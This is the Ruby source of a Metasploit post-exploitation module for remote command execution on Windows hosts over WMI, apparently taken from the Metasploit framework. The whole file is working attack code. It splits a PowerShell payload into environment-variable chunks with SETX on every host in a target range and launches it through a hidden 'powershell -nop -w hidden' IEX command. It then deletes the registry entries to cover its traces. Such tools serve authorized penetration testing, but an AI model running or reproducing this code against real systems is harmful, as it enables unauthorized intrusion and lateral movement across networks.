##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::WMIC

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Management Instrumentation (WMI) Remote Command Execution',
        'Description'   => %q{
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
            'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'
          ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ],
      ))

    register_options([
      OptString.new('SMBUser', [ false, 'The username to authenticate as' ]),
      OptString.new('SMBPass', [ false, 'The password for the specified username' ]),
      OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication' ]),
      OptAddressRange.new("RHOSTS", [ true, "Target address range or CIDR identifier" ]),
      # Move this out of advanced
      OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener'])
    ])
  end

  def exploit
    if datastore['SMBUser'] and datastore['SMBPass'].nil?
      fail_with(Failure::BadConfig, "Need both username and password set.")
    end

    Rex::Socket::RangeWalker.new(datastore["RHOSTS"]).each do |server|
      # TODO: CHECK WMIC Access by reading the clipboard?
      # TODO: wmic /output:clipboard
      # TODO: Needs to be meterpreter ext side due to threading

      # Get the PSH Payload and split it into bitesize chunks
      # 1024 appears to be the max value allowed in env vars
      psh = cmd_psh_payload(payload.encoded).gsub("\r\n","")
      psh = psh[psh.index("$si")..psh.length-1]
      chunks = split_code(psh, 1024)

      begin
        print_status("[#{server}] Storing payload in environment variables")
        env_name = rand_text_alpha(rand(3)+3)
        env_vars = []
        0.upto(chunks.length-1) do |i|
          env_vars << "#{env_name}#{i}"
          c = "cmd /c SETX #{env_vars[i]} \"#{chunks[i]}\" /m"
          wmic_command(server, c)
        end

        x = rand_text_alpha(rand(3)+3)
        exec_cmd = "powershell.exe -nop -w hidden -c $#{x} = ''"
        env_vars.each do |env|
          exec_cmd << "+$env:#{env}"
        end
        exec_cmd << ";IEX $#{x};"

        print_status("[#{server}] Executing payload")
        wmic_command(server, exec_cmd)

        print_status("[#{server}] Cleaning up environment variables")
        env_vars.each do |env|
          cleanup_cmd = "cmd /c REG delete \"HKLM\\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /V #{env} /f"
          wmic_command(server, cleanup_cmd)
        end
      rescue Rex::Post::Meterpreter::RequestError => e
        print_error("[#{server}] Error moving on... #{e}")
        next
      ensure
        select(nil,nil,nil,2)
      end
    end
  end

  def wmic_user_pass_string(domain=datastore['SMBDomain'], user=datastore['SMBUser'], pass=datastore['SMBPass'])
    userpass = ""

    unless user.nil?
      if domain.nil?
        userpass = "/user:\"#{user}\" /password:\"#{pass}\" "
      else
        userpass = "/user:\"#{domain}\\#{user}\" /password:\"#{pass}\" "
      end
    end

    return userpass
  end



  def split_code(psh, chunk_size)
    array = []
    idx = 0
    while (idx < psh.length)
      array << psh[idx, chunk_size]
      idx += chunk_size
    end
    return array
  end

end

